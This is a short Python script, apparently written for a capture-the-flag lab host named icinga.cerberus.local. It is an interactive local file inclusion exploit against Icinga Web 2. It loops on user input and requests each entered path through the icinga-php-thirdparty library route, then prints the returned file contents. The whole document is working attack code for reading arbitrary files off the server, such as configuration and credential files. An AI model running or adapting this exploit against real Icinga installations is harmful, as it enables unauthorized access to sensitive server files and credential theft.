import requests
from colorama import Fore, Style


def lfi(path):
    try:
        url = f'http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty{path}'
        r = requests.get(url)
        if(r.status_code == 200):
            print(Fore.GREEN + f'{r.text}' + Style.RESET_ALL)
        else:
            print(Fore.RED + f'{path} not found' + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f'LFI Error: {e}' + Style.RESET_ALL)


def main():
    while True:
        path = input(Fore.BLUE + '[+] file >>' + Style.RESET_ALL)
        lfi(path)


if __name__ == '__main__':
    main()
